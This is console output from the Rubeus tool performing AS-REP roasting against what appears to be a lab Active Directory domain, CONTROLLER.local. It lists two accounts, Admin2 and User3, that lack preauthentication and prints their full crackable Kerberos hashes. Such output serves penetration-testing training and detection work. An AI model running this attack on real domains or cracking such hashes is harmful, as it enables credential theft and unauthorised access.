   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::4c01:e96e:b958:893d%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:EE8F4827536BAA86293D8630115EEDC4$5D003CA05939
      607480391775923A58D3C64D180FF4455923668EE41E6F78210B70E1E72F74EF2778A46AFBDEEBB9
      F07ABD8C8D953F5BDC69E0519F5E04570A75A8950DD99B5DC660DD8C30D414469887255DC9ED69B6
      D7AC20EFA38474C633756895AEA456110543B1B1EDAA1526F701F48EA7BD6F39278EA819F9693E3B
      F1C0FF64D04199F863F6F7FF4474AD7AB0741B1422FB132A594440D8C63A652BCB7BD0BBAF722F8C
      4914319383A5A413BB4A0A620C9DAD3DB22B5F3AFC222CDBFBB57F57CD89D08AB261455E0EBBA6E2
      34F56CFF3F47A177A12F6913022EDEE07BFB41C6D261B1394DFEB02E61AA379451999FCE8CC9

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::4c01:e96e:b958:893d%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:BDE5FE9DC93AD9A2F0EFC7404CD6B434$0944B1766E6BA
      4809C2E011BB8D8C656ADCA7A38BCECCB8625120DFC70B9970A4079DAEBE748765CD473E65E862F1
      F9C76D577F7C0B3241A850077036CB45354DE6825309D1CD1BC07AC981991A16A7A2075547638E5A
      A69A98B1235AB2762791D26FFC44EAC675DDAD4CDF5313253E3916DF055630B5E5B05A7DE705C6FD
      EE897F115B90E18D4DA0165B1C945949E3F3AB9A1342DDDB2D4CAEBD884F05DBE4D213C30E64A220
      4EA17DDDDE3CFF7EF112CA54352A3E769E7E524A8E7DB6B589C51D8684863338A93C7E5AA7BADC59
      144B3C0AE4DFD255609203BE0729CF8C3F494C10221C6DC644D54562F5B637A9A1649C6F513
